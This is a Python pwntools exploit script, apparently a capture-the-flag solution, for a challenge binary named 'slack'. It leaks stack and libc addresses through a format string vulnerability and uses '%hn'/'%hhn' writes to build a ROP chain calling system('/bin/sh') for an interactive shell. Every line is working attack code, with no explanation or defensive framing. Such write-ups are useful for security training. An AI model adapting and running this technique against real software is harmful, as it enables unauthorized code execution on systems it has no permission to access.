from pwn import *

e = ELF("./slack")
libc = ELF("./libc.so.6")

context.terminal=["konsole", "-e"]
context.log_level="info"

p = process(["./slack"])
# p = remote("challs.actf.co", 31500)

gdb.attach(p)

p.sendlineafter(": ", "%25$p %9$p")

p.recvuntil("You: ")

stack = eval(p.recv(14))

p.recv(1)

libc.address = eval(p.recv(14)) - 0x2206a0

# p.recv(1)

# e.address = eval(p.recv(14)) - 0x12c9

print("stack", hex(stack))
print("libc", hex(libc.address))
# print("binary", hex(e.address))

p.sendafter(": ", "%{}p%25$hn".format((stack - 0x110 - 0x68 - 0x8 + 3) & 0xffff))

p.sendlineafter(": ", "%{}p%55$hhn".format(0xff))


def write_stack(off, val):
    print("writing", hex(val & 0xff))
    p.sendlineafter(": ", "%{}p%25$hn".format((stack - 0x110 + off) & 0xffff))
    p.sendlineafter(": ", "%{}p%55$hhn".format(val & 0xff))

def write_stack_2(off, val):
    print("writing", hex(val & 0xffff))
    p.sendlineafter(": ", "%{}p%25$hn".format((stack - 0x110 + off) & 0xffff))
    p.sendlineafter(": ", "%{}p%55$hn".format(val & 0xffff))

ret = libc.address + 0x000000000005d5b7
pop_rdi = libc.address + 0x000000000002a3e5
binsh = next(libc.search('/bin/sh'))
system = libc.sym["system"]

for i in range(6):
    write_stack(i, ret >> (i * 8))

for i in range(6):
    write_stack(i+8, pop_rdi >> (i * 8))

for i in range(6):
    write_stack(i+16, binsh >> (i * 8))

write_stack_2(24, system & 0xffff)

for i in range(2, 6):
    write_stack(i+24, system >> (i*8))

p.sendlineafter(": ", "%{}p%25$hn".format((stack - 0x110 - 0x68 - 0x8 + 3) & 0xffff))

p.sendlineafter(": ", "%55$hhn")


# p.sendlineafter(": ", "%{}p%25$hn".format((stack - 0x110 - 0x68 - 0x8 + 3) & 0xffff))

# p.sendlineafter(": ", "%55$hhn")

p.interactive()